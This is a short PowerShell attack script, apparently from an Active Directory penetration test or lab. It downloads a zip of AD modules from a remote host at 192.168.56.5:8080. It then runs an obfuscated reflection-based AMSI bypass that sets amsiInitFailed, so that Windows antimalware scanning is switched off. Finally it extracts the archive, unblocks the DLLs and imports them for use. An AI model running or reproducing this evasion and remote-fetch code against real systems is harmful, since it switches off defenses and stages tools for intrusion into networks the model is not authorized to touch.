#grab script from online
iwr -uri "http://192.168.56.5:8080/admodule.zip" -outfile admodule.zip

#bypass Amsi
[ReF]."`A$(echo sse)`mB$(echo L)`Y"."g`E$(echo tty)p`E"(( "Sy{3}ana{1}ut{4}ti{2}{0}ils" -f'iUt','gement.A',"on.Am`s",'stem.M','oma') )."$(echo ge)`Tf`i$(echo El)D"(("{0}{2}ni{1}iled" -f'am','tFa',"`siI"),("{2}ubl{0}`,{1}{0}" -f 'ic','Stat','NonP'))."$(echo Se)t`Va$(echo LUE)"($(),$(1 -eq 1))

# Extract/import modules

Expand-Archive -Path "$PSScriptRoot/admodule.zip" -DestinationPath "$PSScriptRoot" -Force
rm "$PSScriptRoot/admodule.zip"
$path = "$PSscriptRoot/ADModule-master"
Unblock-File -Path $path\Microsoft.ActiveDirectory.Management.dll
Unblock-File -Path $path\ActiveDirectory\ActiveDirectory.psd1 
Import-Module $path\Microsoft.ActiveDirectory.Management.dll -verbose
Import-Module $path\ActiveDirectory\ActiveDirectory.psd1 -verbose
